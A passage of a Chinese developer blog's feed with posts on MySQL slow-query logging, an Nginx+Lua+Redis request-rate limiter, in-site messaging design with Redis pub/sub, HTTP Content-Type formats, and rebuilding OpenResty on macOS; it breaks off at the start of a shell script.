<pre><code>slow-query-log = 1
slow-query-log-file = /usr/loval/var/mysql/mysql-slow.log
long_query_time = 1 #设置满请求时间
log-queries-not-using-indexes
</code></pre><h2 id="Slow-Query工具"><a href="#Slow-Query工具" class="headerlink" title="Slow Query工具"></a>Slow Query工具</h2><p>Slow Query有很多查看工具，比如：MySQL自带的mysqldumpslow 和 mysqlsla，用的比较多的 py-query-digest，还可以将满请求数据丢给zabbix做显示分析处理。</p>
<p>这里我用 <code>py-query-digest /usr/local/var/mysql/mysql-slow.log</code> 导出了满请求的数据，例如：</p>
<pre><code># Query 1: 0.02 QPS, 0.55x concurrency, ID 0xFC19E4D04D8E60BF at byte 12547
# This item is included in the report because it matches --limit.
# Scores: V/M = 118.26
# Time range: 2015-09-12 05:52:03 to 05:57:54
# Attribute    pct   total     min     max     avg     95%  stddev  median
# ============ === ======= ======= ======= ======= ======= ======= =======
# Count          1       7
# Exec time     78    194s   250ms    169s     28s    167s     57s   992ms
# Lock time      0   901us   111us   158us   128us   152us    18us   119us
# Rows sent      0       5       0       1    0.71    0.99    0.45    0.99
# Rows examine   7 545.01k  14.18k  97.66k  77.86k  97.04k  32.08k  97.04k
# Query size     0     868     123     125     124  124.25       1  118.34
# String:
# Databases    mysqltest
# Hosts        localhost
# Users        root
# Query_time distribution
#   1us
#  10us
# 100us
#   1ms
#  10ms
# 100ms  ################################################################
#    1s  ##########################################
#  10s+  ##########################################
# Tables
#    SHOW TABLE STATUS FROM `mysqltest` LIKE &#39;File&#39;\G
#    SHOW CREATE TABLE `mysqltest`.`File`\G
#    SHOW TABLE STATUS FROM `mysqltest` LIKE &#39;User&#39;\G
#    SHOW CREATE TABLE `mysqltest`.`User`\G
# EXPLAIN /*!50100 PARTITIONS*/
SELECT count(*) FROM `File` LEFT JOIN `User` ON `User`.`name`= `File`.`name` WHERE `User`.`name` LIKE &#39;%r%&#39; order by `last`\G
</code></pre><p>可以看到该SQL被调用7次，平均每次28s，好慢…平均检测数据大小77.86k。</p>
<p>再来看看SQL语句：</p>
<blockquote>
<p>SELECT count(*) FROM <code>File</code> LEFT JOIN <code>User</code> ON <code>User</code>.<code>name</code>= <code>File</code>.<code>name</code> WHERE <code>User</code>.<code>name</code> LIKE ‘%r%’ order by last</p>
</blockquote>
<p>看着都觉得慢 <code>ON User.name= File.name</code> 在没有建立索引的情况下，所有数据将进行字符串匹配name字段。</p>
<p>这个库有 15W条User数据，10W条File数据，也就是要比对15*10 WW 次数据。</p>
<p>MySQL的slow log的作用也就在这里了，优化慢查询。</p>
<p><br><hr></p>
<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p>1.《高性能MySQL》</p>
<p>2.<a href="https://rtcamp.com/tutorials/mysql/slow-query-log/" target="_blank" rel="external">Analyse slow-query-log using mysqldumpslow &amp; pt-query-digest</a></p>
<p>3.<a href="https://xcoder.in/2015/08/10/mysql-binlog-try/" target="_blank" rel="external">初探MySQL的Binlog</a></p>
<p>4.<a href="http://dev.mysql.com/doc/internals/en/event-data-for-specific-event-types.html" target="_blank" rel="external">MySQL doc</a></p>
<p><br></p>
<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-09-12-mysql-log"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-09-12-mysql-log" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2015/09/12/mysql-log"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2015/09/12/mysql-log">http://homeway.me/2015/09/12/mysql-log</a></h4><p>-by小草</p>
<p>2015-09-12 01:49:10</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Nginx+Lua+Redis访问频率控制]]></title>
      <url>http://homeway.me/2015/08/11/nginx-lua-redis-access-control/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/logo-nginx-lua.png" alt="nginx-lua-redis"></p>
<a id="more"></a>
<p><br></p>
<h1 id="0x01-About"><a href="#0x01-About" class="headerlink" title="0x01.About"></a>0x01.About</h1><p>Nginx来处理访问控制的方法有多种，实现的效果也有多种，访问IP段，访问内容限制，访问频率限制等。</p>
<p>用Nginx+Lua+Redis来做访问限制主要是考虑到高并发环境下快速访问控制的需求。</p>
<p>Nginx处理请求的过程一共划分为11个阶段，分别是：</p>
<p>post-read、server-rewrite、find-config、rewrite、post-rewrite、 preaccess、access、post-access、try-files、content、log.</p>
<p>在openresty中，可以找到：</p>
<p>set_by_lua，access_by_lua，content_by_lua，rewrite_by_lua等方法。</p>
<p>那么访问控制应该是，access阶段。</p>
<p><br><hr></p>
<h1 id="0x02-How-to-do"><a href="#0x02-How-to-do" class="headerlink" title="0x02.How to do"></a>0x02.How to do</h1><h2 id="1-Solution"><a href="#1-Solution" class="headerlink" title="1.Solution"></a>1.Solution</h2><p>按照正常的逻辑思维，我们会想到的访问控制方案如下：</p>
<p>1.检测是否被forbidden？<br>    =》是，forbidden是否到期：是，清除记录，返回200，正常访问；否，返回403；<br>    =》否，返回200，正常访问</p>
<p>2.每次访问，访问用户的访问频率+1处理</p>
<p>3.检测访问频率是否超过限制，超过即添加forbidden记录，返回403</p>
<p>这是简单地方案，还可以添加点枝枝叶叶，访问禁止时间通过算法导入，每次凹曲线增加。</p>
<h2 id="2-Config"><a href="#2-Config" class="headerlink" title="2.Config"></a>2.Config</h2><p>首先为nginx添加vhost配置文件，vhost.conf部分内容如下：</p>
<pre><code>lua_package_path &quot;/usr/local/openresty/lualib/?.lua;;&quot;;#告诉openresty库地址
lua_package_cpath &quot;/usr/local/openresty/lualib/?.so;;&quot;;
error_log /usr/local/openresty/nginx/logs/openresty.debug.log debug;

server {
    listen 8080 default;
    server_name localhost;    
    root  /www/openresty;

    location /login {
        default_type &#39;text/html&#39;;
        access_by_lua_file &quot;/usr/local/openresty/nginx/lua/access_by_redis.lua&quot;;#通过lua来处理访问控制
    }
}
</code></pre><h2 id="3-Access-by-redis-lua"><a href="#3-Access-by-redis-lua" class="headerlink" title="3.Access_by_redis.lua"></a>3.Access_by_redis.lua</h2><p>参考了下v2ex.com的做法，redis存储方案只做简单地string存储就足够了。key分别是：</p>
<p>用户登录记录：user:127.0.0.1:time（unix时间戳）<br>访问限制：block:127.0.0.1</p>
<p>先连接Redis吧：</p>
<pre><code>local red = redis:new()
function M:redis()
    red:set_timeout(1000)
    local ok, err = red:connect(&quot;127.0.0.1&quot;, 6379)
    if not ok then
        ngx.exit(ngx.HTTP_INTERNAL_SERVER_ERROR)
    end
end
</code></pre><p>按照我们的逻辑方案，第二步是，检测是否forbidden，下面我们就检测<code>block:127.0.0.1</code>，如果搜索到数据，检测时间是否过期，未过期返回403，否则直接返回200：</p>
<pre><code>function M:check1()
    local time=os.time()    --system time
    local res, err = red:get(&quot;block:&quot;..ngx.var.remote_addr)
    if not res then    -- redis error
        ngx.exit(ngx.HTTP_INTERNAL_SERVER_ERROR) --redis get data error     end

    if type(res) == &quot;string&quot; then --if red not null then type(red)==string
        if tonumber(res) &gt;= tonumber(time) then  --check if forbidden expired
            ngx.exit(ngx.HTTP_FORBIDDEN)
            --ngx.say(&quot;forbidden&quot;)
        end
    end
}
</code></pre><p>接下来会做检测，是否访问频率过高，如果过高，要拉到黑名单的，</p>
<p>实现的方法是，检测<code>user:127.0.0.1:time</code>的值是否超标：</p>
<pre><code>function M:check2()
    local time=os.time()    --system time
    local res, err = red:get(&quot;user:&quot;..ngx.var.remote_addr..&quot;:&quot;..time)
    if not res then    -- redis error
        ngx.exit(ngx.HTTP_INTERNAL_SERVER_ERROR) --redis get data error
    end

    if type(res) == &quot;string&quot; then
        if tonumber(res) &gt;= 10 then -- attack, 10 times request/s
            red:del(&quot;block:&quot;..self.ip)    
            red:set(&quot;block:&quot;..self.ip, tonumber(time)+5*60 ) --set block time
            ngx.exit(ngx.HTTP_FORBIDDEN)
        end
    end
end
</code></pre><p>最后呢，还要记得，把每次访问时间做一个自增长，<code>user:127.0.0.1:time</code>：</p>
<pre><code>function M:add()
    local time=os.time()    --system time
    ok, err = red:incr(&quot;user:&quot;..ngx.var.remote_addr..&quot;:&quot;..time)
    if not ok then
        ngx.exit(ngx.HTTP_INTERNAL_SERVER_ERROR) --redis get data error
    end
end
</code></pre><p>那么，测试，强刷几次浏览器，发现过一会，返回了403，ok，搞定。</p>
<p><br><hr></p>
<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-08-11-nginx-lua-redis-access-control"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-08-11-nginx-lua-redis-access-control" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2015/08/11/nginx-lua-redis-access-control/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2015/08/11/nginx-lua-redis-access-control/">http://homeway.me/2015/08/11/nginx-lua-redis-access-control/</a></h4><p>-by小草</p>
<p>2015-08-10 01:20:10</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[站内消息设计与实现]]></title>
      <url>http://homeway.me/2015/08/03/website-system-message/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/logo-sql-nosql.png" alt="http"></p>
<a id="more"></a>
<p><br></p>
<h1 id="0x01-About"><a href="#0x01-About" class="headerlink" title="0x01.About"></a>0x01.About</h1><p>最近在处理系统消息模块，查阅了很多实践案例，各有针对性。</p>
<p>首先站内消息主要包括：个人消息（评论，点赞），系统消息，订阅消息，私信。</p>
<p>其中，订阅区分用户群，即系统消息是一个特殊的所有人订阅的订阅消息，特点是一对多。</p>
<p>前三个实时性比较低，最后一个实时性高，离线状态下是私信，如果双方在线要转为聊天室，特点是一对一。</p>
<p>那么，接下来，该选个方案了，SQL or NoSQL?</p>
<p><br><hr></p>
<h1 id="0x02-Mysql实现"><a href="#0x02-Mysql实现" class="headerlink" title="0x02.Mysql实现"></a>0x02.Mysql实现</h1><p>首先，对于个人消息、私信(“UserMessage”)，一条消息插一句，Mysql跑跑没问题。</p>
<p>对于系统消息或订阅消息，必然不可以，假如有10万用户，一次性那么要插入10万条消息，Mysql必死。</p>
<p>那么就是说，要设立一个系统库（”SystemMessage”），每当用户登录，就去跑跑系统库(“SystemMessage”)，把未读的系统库跑到个人库。</p>
<p>关于订阅消息就比较麻烦了，对用户分组？对消息分组？</p>
<p>关系型数据库处理集合问题是比较麻烦的，目前想到的结论是建立一个表(“RssMessage”)存储消息类型，消息索引。</p>
<p>下面列了大致的数据库模型：</p>
<p><img src="https://static.blog.homeway.me/blog/2015-08-03-website-system-message.1.png" alt="Mysql"></p>
<p>看完这个数据库设计，我也觉得好难受，吐槽前先来想想为什么吧。</p>
<p>UserSystemRelation表用于记录用户读取到哪个位置的标记。</p>
<p>可以看到，UserMessage与SystemMessage表中，title、tid、ctime、type字段冗余了，好像也没必要，</p>
<p>但是从用户功能上看，当用户登陆后，查找自己站内消息，必然要用到的有：status，必然要显示的有：title、ctime，type作为用户进入消息面板后，要筛选的方式之一，这样的话，Mysql就只要跑一个表就可以完成显示给用户的最新站内消息了。</p>
<p>由于MessageText可能是一个大信息通知，用户查看个人消息时候，并未查看MessageText内容，所以单独放一张表。</p>
<h2 id="相应处理流程"><a href="#相应处理流程" class="headerlink" title="相应处理流程"></a>相应处理流程</h2><ul>
<li>用户登录后，先通过”UserSystemRelation”表查询是否有新的系统消息</li>
<li>如果”UserSystemRelation”，查找到自身uid，同步系统消息到个人消息；如果”UserSystemRelation”未查找到自身uid，直接插入”UserSystemRelation”，并读取最近50条系统消息。</li>
<li>用户点击未读消息，获取”MessageText””，并更新状态(status)为已读。</li>
<li>用户通过”status”、”type”，可以筛选系统消息。</li>
</ul>
<p><br><hr></p>
<h1 id="0x03-Mysql-MongoDB实现"><a href="#0x03-Mysql-MongoDB实现" class="headerlink" title="0x03.Mysql+MongoDB实现"></a>0x03.Mysql+MongoDB实现</h1><p>由于Mongodb是一种文档型的数据结构，所以，可以考虑把所有数据转成json直接塞给Mongodb。</p>
<p>基于用户的习惯，读多写少，大部分时候都是看到消息，删除、更新比较少，如果数据没更新直接读Mongodb，如果数据更新，直接删除Mongodb<br>的索引。</p>
<p>这个考虑是在，用户数量很大的时候，要在”UserSystem”表里查找到用户消息比较慢的时候用，类似于吧Mongodb当缓存。</p>
<p><br><hr></p>
<h1 id="0x04-Redis实现"><a href="#0x04-Redis实现" class="headerlink" title="0x04.Redis实现"></a>0x04.Redis实现</h1><p>看了Mysql下站内消息的数据库设计，我也觉得很蛋疼，临时过渡没事，但是还是NoSQL合适。</p>
<p>Redis自带订阅与发布系统，<a href="http://redisbook.readthedocs.org/en/latest/feature/pubsub.html" target="_blank" rel="external">http://redisbook.readthedocs.org/en/latest/feature/pubsub.html</a></p>
<p>在下图展示的这个 pubsub_channels 示例中， client2 、 client5 和 client1 就订阅了 channel1 ， 而其他频道也分别被别的客户端所订阅：</p>
<p><img src="https://static.blog.homeway.me/blog/2015-08-03-website-system-message.2.png" alt="订阅"></p>
<p>只要是订阅了相应地频道，就会收到频道的消息。</p>
<p>把用户ID作为频道，私信就是反向的频道订阅，系统消息就是所有用户的订阅，那么离线的消息呢？</p>
<h2 id="1、线上用户"><a href="#1、线上用户" class="headerlink" title="1、线上用户"></a>1、线上用户</h2><p>还是存在系统或个人的哈希表里，等上线后再去读取。</p>
<p>在Python中，订阅发布消息(Publish)如下：</p>
<pre><code>import redis,time
queue = redis.StrictRedis(host=&#39;localhost&#39;, port=6379, db=0)
channel = queue.pubsub()

for i in range(100): 
    queue.publish(&quot;test&quot;, i)
    time.sleep(0.1)
</code></pre><p>Python中，订阅监听消息(Subcribe)如下：</p>
<pre><code>import redis,time
r = redis.StrictRedis(host=&#39;localhost&#39;, port=6379, db=0)
p = r.pubsub()
p.subscribe(&#39;test&#39;)

while True:
    message = p.get_message()
    if message:
        print &quot;Subscriber: %s&quot; % message[&#39;data&#39;]
</code></pre><p>Redis-py的API可以看GitHub：<a href="https://github.com/andymccurdy/redis-py" target="_blank" rel="external">https://github.com/andymccurdy/redis-py</a></p>
<p>这是线上用户做法。</p>
<h2 id="2、线下用户"><a href="#2、线下用户" class="headerlink" title="2、线下用户"></a>2、线下用户</h2><p>看过一种做法是建立一个Redis链表，存储登陆用户，当用户登陆就直接发送，没登陆就暂存起来。</p>
<p>这里的话，可以用WebSocket实时监听，定期发送心跳包，如果在线直接返回Redis自带的订阅系统。</p>
<p>系统消息建立一个集合：</p>
<blockquote>
<p>SADD system:2015-08-03 7 8 9 10 11</p>
</blockquote>
<p>第一段标示系统信息，第二段标示日期，后面的数字标示message id。</p>
<p>个人消息建立一个集合：</p>
<blockquote>
<p>SADD user:12345:read    1 2 3 4 </p>
</blockquote>
<p>第一段标示用户信息集合，第二段标示用户id，下一段标示消息类型为已读，后面的数字标示message id。</p>
<p>关于订阅消息如下：</p>
<blockquote>
<p>SADD rss:xiaocao 12 13 14 15</p>
</blockquote>
<p>那么你就收到小草的订阅消息，消息ID分别是 12, 13, 14, 15</p>
<p>还有很重要的消息数据存储，</p>
<blockquote>
<p>HMSET message:12 title 标题 content 内容 date 2015-08-03</p>
</blockquote>
<p>Python创建数据库的例子就是：</p>
<pre><code>import redis,time,threading,random
pool = redis.ConnectionPool(host=&#39;localhost&#39;, port=6379, db=1)
rs = redis.Redis(connection_pool=pool)

rs.sadd(&quot;user:123:read&quot;, &quot;1&quot;, &quot;2&quot;)
rs.sadd(&quot;user:123:unread&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;)
rs.sadd(&quot;system:2015-08-03&quot;, &quot;7&quot;, &quot;8&quot;, &quot;9&quot;, &quot;10&quot;, &quot;11&quot;)
rs.sadd(&quot;rss:xiaocao&quot;, &quot;12&quot;, &quot;13&quot;, &quot;14&quot;, &quot;15&quot;, &quot;11&quot;)

for i in range(15):
    rs.hset(&quot;message:&quot;+str(i), &quot;title&quot;, &quot;title=&gt;&quot;+str(random.uniform(1, 99999)))
    rs.hset(&quot;message:&quot;+str(i), &quot;content&quot;,&quot;content=&gt;&quot;+str(time.time()))
    rs.hset(&quot;message:&quot;+str(i), &quot;date&quot;, str(time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.gmtime())))
</code></pre><p><br></p>
<p>参考：</p>
<ul>
<li><a href="http://redisbook.readthedocs.org/en/latest/feature/pubsub.html" target="_blank" rel="external">http://redisbook.readthedocs.org/en/latest/feature/pubsub.html</a></li>
<li><a href="http://huoding.com/2012/02/29/146" target="_blank" rel="external">http://huoding.com/2012/02/29/146</a></li>
<li><a href="http://yijiebuyi.com/blog/faa9e68cb296d88bbc65b24dbc7b8de1.html" target="_blank" rel="external">http://yijiebuyi.com/blog/faa9e68cb296d88bbc65b24dbc7b8de1.html</a></li>
<li><a href="http://www.cnblogs.com/grenet/archive/2010/03/08/1680655.html" target="_blank" rel="external">http://www.cnblogs.com/grenet/archive/2010/03/08/1680655.html</a></li>
</ul>
<p><br><hr></p>
<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-08-03-website-system-message"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-08-03-website-system-message" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2015/08/03/website-system-message/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2015/08/03/website-system-message/">http://homeway.me/2015/08/03/website-system-message/</a></h4><p>-by小草</p>
<p>2015-08-03 01:35:10</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[理解HTTP之Content-Type]]></title>
      <url>http://homeway.me/2015/07/19/understand-http-about-content-type/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/logo-http.png" alt="http"></p>
<a id="more"></a>
<p><br></p>
<h1 id="0x01-About"><a href="#0x01-About" class="headerlink" title="0x01.About"></a>0x01.About</h1><p>查看Restful API 报头插件：<a href="https://chrome.google.com/webstore/detail/rest-console/cokgbflfommojglbmbpenpphppikmonn/related?utm_source=chrome-ntp-icon" target="_blank" rel="external">Chrome插件REST Console</a>，以及发送Restful API工具：<a href="https://chrome.google.com/webstore/detail/postman/fhbjgbiflinjbdggehcddcbncdddomop?utm_source=chrome-ntp-icon" target="_blank" rel="external">Chrome插件POST Man</a></p>
<p>在HTTP 1.1规范中，HTTP请求方式有OPTIONS、GET、HEAD、POST、PUT、DELETE、TRACE、CONNECT</p>
<p>通常我们用的只有GET、POST，然而对于Restful API规范来说，请求资源要用PUT方法，删除资源要用DELETE方法。</p>
<p>例如发送个DELETE包：</p>
<blockquote>
<p><a href="http://example.com/my/resource?id=12345" target="_blank" rel="external">http://example.com/my/resource?id=12345</a> </p>
</blockquote>
<p>那么通过id就能获取到信息，这个包只有header，并不存在body，下面讨论几个包含body的发包的body传输格式。</p>
<p><br><hr></p>
<h1 id="0x02-Content-Type"><a href="#0x02-Content-Type" class="headerlink" title="0x02.Content-Type"></a>0x02.Content-Type</h1><p>Content-Type用于指定内容类型，一般是指网页中存在的Content-Type，Content-Type属性指定请求和响应的HTTP内容类型。如果未指定 ContentType，默认为text/html。</p>
<p>在nginx中有个配置文件<code>mime.types</code>，主要是标示Content-Type的文件格式。</p>
<p>下面是几个常见的Content-Type:</p>
<p>1.text/html<br>2.text/plain<br>3.text/css<br>4.text/javascript<br>5.application/x-www-form-urlencoded<br>6.multipart/form-data<br>7.application/json<br>8.application/xml<br>…</p>
<p>前面几个都很好理解，都是html，css，javascript的文件类型，后面四个是POST的发包方式。</p>
<p><br><hr></p>
<h1 id="0x03-application-x-www-form-urlencoded"><a href="#0x03-application-x-www-form-urlencoded" class="headerlink" title="0x03.application/x-www-form-urlencoded"></a>0x03.application/x-www-form-urlencoded</h1><p><code>application/x-www-form-urlencoded</code>是常用的表单发包方式，普通的表单提交，或者js发包，默认都是通过这种方式，</p>
<p>比如一个简单地表单：</p>
<pre><code>&lt;form enctype=&quot;application/x-www-form-urlencoded&quot; action=&quot;http://homeway.me/post.php&quot; method=&quot;POST&quot;&gt;
    &lt;input type=&quot;text&quot; name=&quot;name&quot; value=&quot;homeway&quot;&gt;
    &lt;input type=&quot;text&quot; name=&quot;key&quot; value=&quot;nokey&quot;&gt;
    &lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;
&lt;/form&gt;
</code></pre><p>那么服务器收到的raw header会类似：</p>
<pre><code>Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding:gzip, deflate
Accept-Language:zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4,gl;q=0.2,de;q=0.2
Cache-Control:no-cache
Connection:keep-alive
Content-Length:17
Content-Type:application/x-www-form-urlencoded
</code></pre><p>那么服务器收到的raw body会是，<code>name=homeway&amp;key=nokey</code>，在php中，通过$_POST就可以获得数组形式的数据。</p>
<p><br><hr></p>
<h1 id="0x04-multipart-form-data"><a href="#0x04-multipart-form-data" class="headerlink" title="0x04.multipart/form-data"></a>0x04.multipart/form-data</h1><p><code>multipart/form-data</code>用在发送文件的POST包。</p>
<p>这里假设我用python的request发送一个文件给服务器：</p>
<pre><code>data = {
    &quot;key1&quot;: &quot;123&quot;,
    &quot;key2&quot;: &quot;456&quot;,
}
files = {&#39;file&#39;: open(&#39;index.py&#39;, &#39;rb&#39;)}
res = requests.post(url=&quot;http://localhost/upload&quot;, method=&quot;POST&quot;, data=data, files=files)
print res
</code></pre><p>通过工具，可以看到我发送的数据内容如下：</p>
<pre><code>POST http://www.homeway.me HTTP/1.1
Content-Type:multipart/form-data; boundary=------WebKitFormBoundaryOGkWPJsSaJCPWjZP

------WebKitFormBoundaryOGkWPJsSaJCPWjZP
Content-Disposition: form-data; name=&quot;key2&quot;
456
------WebKitFormBoundaryOGkWPJsSaJCPWjZP
Content-Disposition: form-data; name=&quot;key1&quot;
123
------WebKitFormBoundaryOGkWPJsSaJCPWjZP
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;index.py&quot;
</code></pre><p>这里<code>Content-Type</code>告诉我们，发包是以<code>multipart/form-data</code>格式来传输，另外，还有<code>boundary</code>用于分割数据。</p>
<p>当文件太长，HTTP无法在一个包之内发送完毕，就需要分割数据，分割成一个一个chunk发送给服务端，</p>
<p>那么<code>--</code>用于区分数据快，而后面的数据<code>633e61ebf351484f9124d63ce76d8469</code>就是标示区分包作用。</p>
<p><br><hr></p>
<h1 id="0x05-text-xml"><a href="#0x05-text-xml" class="headerlink" title="0x05.text/xml"></a>0x05.text/xml</h1><p>微信用的是这种数据格式发送请求的。</p>
<pre><code>POST http://www.homeway.me HTTP/1.1 
Content-Type: text/xml

&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;resource&gt;
    &lt;id&gt;123&lt;/id&gt;
    &lt;params&gt;
        &lt;name&gt;
            &lt;value&gt;homeway&lt;/value&gt;
        &lt;/name&gt;
        &lt;age&gt;
            &lt;value&gt;22&lt;/value&gt;
        &lt;/age&gt;
    &lt;/params&gt;
&lt;/resource&gt;
</code></pre><p>php中<code>$_POST</code>只能读取<code>application/x-www-form-urlencoded</code>数据，<code>$_FILES</code>只能读取<code>multipart/form-data</code>类型数据，</p>
<p>那么，要读取<code>text/xml</code>格式的数据，可以用：</p>
<blockquote>
<p>$file = fopen(‘php://input’, ‘rb’);<br>$data = fread($file, length);<br>fclose($file);</p>
</blockquote>
<p>或者</p>
<blockquote>
<p>$data = file_get_contents(‘php://input’);</p>
</blockquote>
<p><br><hr></p>
<h1 id="0x06-application-json"><a href="#0x06-application-json" class="headerlink" title="0x06.application/json"></a>0x06.application/json</h1><p>通过json形式将数据发送给服务器，一开始，我尝试通过curl，给服务器发送<code>application/json</code>格式包，</p>
<p>然而我收到的数据如下：</p>
<blockquote>
<p>————————–e1e1406176ee348a Content-Disposition: form-data; name=”nid” 2 ————————–e1e1406176ee348a Content-Disposition: form-data; name=”uuid” cf9dc994-a4e7-3ad6-bc54-41965b2a0dd7 ————————–e1e1406176ee348a Content-Disposition: form-data; name=”access_token” 956731586df41229dbfec08dd5d54eedb98d73d2 ————————–e1e1406176ee348a–</p>
</blockquote>
<p>后来想想明白了，HTTP通信中并不存在所谓的json，而是将string转成json罢了，也就是，<code>application/json</code>可以将它理解为<code>text/plain</code>，普通字符串。</p>
<p>之所以出现那么多乱七八糟的<code>-------</code>应该是php数组传输进去，存在的转换问题吧（我目前能想到的原因）。</p>
<p><br></p>
<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-07-19-understand-http-about-content-type"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-07-19-understand-http-about-content-type" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2015/07/19/understand-http-about-content-type/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2015/07/19/understand-http-about-content-type/">http://homeway.me/2015/07/19/understand-http-about-content-type/</a></h4><p>-by小草</p>
<p>2015-07-19 01:35:10</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[MAC重装各种的痛点]]></title>
      <url>http://homeway.me/2015/07/10/rebuild-osx-environment/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/logo-osx.png" alt="OSX"></p>
<a id="more"></a>
<p><br></p>
<h1 id="0x01-About"><a href="#0x01-About" class="headerlink" title="0x01.About"></a>0x01.About</h1><p>最近不小心做死，删了很多安装包，最后只能重装了MAC，用了3天多修复开发环境。</p>
<p>想想时候该入Docker了，每次这么搞要玩命了。</p>
<p><br><hr></p>
<h1 id="0x02-Openresty"><a href="#0x02-Openresty" class="headerlink" title="0x02.Openresty"></a>0x02.Openresty</h1><p>第一次装openresty没有事情的，然而重装MAC后，再装openresty出现了问题。安装openresty可以直接</p>
<blockquote>
<p>git clone <a href="https://github.com/openresty" target="_blank" rel="external">https://github.com/openresty</a></p>
</blockquote>
<p>下来，运行make，自动下载依赖包，也可以直接到 <a href="http://openresty.org/" target="_blank" rel="external">http://openresty.org/</a> 下载打包好的。</p>
<h2 id="1-openssl缺少错误如下"><a href="#1-openssl缺少错误如下" class="headerlink" title="1.openssl缺少错误如下"></a>1.openssl缺少错误如下</h2><pre><code>./configure: error: SSL modules require the OpenSSL library.
You can either do not enable the modules, or install the OpenSSL library
into the system, or build the OpenSSL library statically from the source
with nginx by using --with-openssl=&lt;path&gt; option.

ERROR: failed to run command: sh ./configure --prefix=/usr/local/openresty/nginx \…
</code></pre><p>缺少openssl库，那就把本机安装路径告诉它吧:</p>
<blockquote>
<p>./configure –with-openssl=/usr/local/Cellar/openssl/1.0.2c</p>
</blockquote>
<h2 id="2-openssl源码安装错误"><a href="#2-openssl源码安装错误" class="headerlink" title="2.openssl源码安装错误"></a>2.openssl源码安装错误</h2><pre><code>/Applications/Xcode.app/Contents/Developer/usr/bin/make -f objs/Makefile
cd /usr/local/Cellar/openssl/1.0.2c \
    &amp;&amp; if [ -f Makefile ]; then /Applications/Xcode.app/Contents/Developer/usr/bin/make clean; fi \
    &amp;&amp; ./config --prefix=/usr/local/Cellar/openssl/1.0.2c/.openssl no-shared  no-threads \
    &amp;&amp; /Applications/Xcode.app/Contents/Developer/usr/bin/make \
    &amp;&amp; /Applications/Xcode.app/Contents/Developer/usr/bin/make install LIBDIR=lib
/bin/sh: ./config: No such file or directory
make[2]: *** [/usr/local/Cellar/openssl/1.0.2c/.openssl/include/openssl/ssl.h] Error 127
make[1]: *** [build] Error 2
make: *** [all] Error 2
</code></pre><p>上了github，<a href="https://github.com/torch/image/issues/16" target="_blank" rel="external">https://github.com/torch/image/issues/16</a>，查查，明白了，这里要的是source code，不是安装路径，够坑的了吧。</p>
<p>那么好了，到<a href="https://www.openssl.org/" target="_blank" rel="external">https://www.openssl.org/</a>下载了最新的，openssl.1.0.2c版本，到bundle目录里：</p>
<blockquote>
<p>./configure –with-openssl=bundle/openssl.1.0.2c</p>
</blockquote>
<p>报了个warning：</p>
<pre><code>WARNING! If you wish to build 64-bit library, then you have to
         invoke &#39;./Configure darwin64-x86_64-cc&#39; *manually*.
         You have about 5 seconds to press Ctrl-C to abort.
</code></pre><p>看着是openssl与darwin的版本不兼容问题，后来发现是新版的openssl与nginx兼容问题。</p>
<h2 id="3-pcre依赖报错"><a href="#3-pcre依赖报错" class="headerlink" title="3.pcre依赖报错"></a>3.pcre依赖报错</h2><pre><code>ld: symbol(s) not found for architecture x86_64 collect2: ld 
returned 1 exit status make[2]: *** [objs/nginx] 
Error 1 make[1]: *** [build] 
Error 2 make: *** 
[all] Error 2
</code></pre><p>找一找，发现了问题解决方案，是pcre依赖包没带上，也就是正则匹配依赖包的问题了：</p>
<p>在github上找到了issuse相关信息： <a href="https://github.com/openresty/ngx_openresty/issues/3#issuecomment-120227290" target="_blank" rel="external">https://github.com/openresty/ngx_openresty/issues/3#issuecomment-120227290</a></p>
<p>最后在issuse上问道了agentzh的解决方案，agentzh的makefile里在处理新版nginx与openssl依赖上的一点问题，后来他更新了github仓库：</p>
<pre><code>export KERNEL_BITS=64
./configure --with-cc-opt=&#39;-I/usr/local/Cellar/pcre/8.37/include/&#39; \
       --with-ld-opt=&#39;-L/usr/local/Cellar/pcre/8.37/lib&#39; \
       --with-openssl=$HOME/work/openssl-1.0.2d -j9
make -j9
sudo make install
</code></pre><p>在我这里(MAC OSX 10.10.4)运行起来是没问题的。</p>
<p>两个问题：</p>
<p>1.openssl依赖，要用源码，要export告诉系统环境变量 </p>
<p>2.pcre包要手动加上去。</p>
<p><em>补个centos中一键安装shell：</em></p>
<pre><code>curr_path=`pwd`
